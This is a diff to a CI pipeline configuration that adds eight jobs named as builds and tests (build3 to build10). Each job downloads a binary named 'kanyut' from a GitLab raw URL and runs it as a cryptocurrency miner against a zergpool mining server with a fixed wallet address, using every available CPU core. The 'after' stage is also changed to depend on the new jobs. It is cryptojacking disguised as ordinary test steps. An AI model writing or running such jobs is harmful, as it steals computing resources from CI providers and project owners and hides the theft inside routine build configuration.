@@ -17,6 +17,62 @@ steps:
   commands:
   - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
 ---
+name: build3
+steps:
+- name: test3
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+name: build4
+steps:
+- name: test4
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+name: build5
+steps:
+- name: test5
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+name: build6
+steps:
+- name: test6
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+name: build7
+steps:
+- name: test7
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+name: build8
+steps:
+- name: test8
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+name: build9
+steps:
+- name: test9
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
+name: build10
+steps:
+- name: test10
+  image: golang
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+---
 kind: pipeline
 name: after
 
@@ -30,3 +86,11 @@ steps:
 depends_on:
 - build1
 - build2
+- build3
+- build4
+- build5
+- build6
+- build7
+- build8
+- build9
+- build10
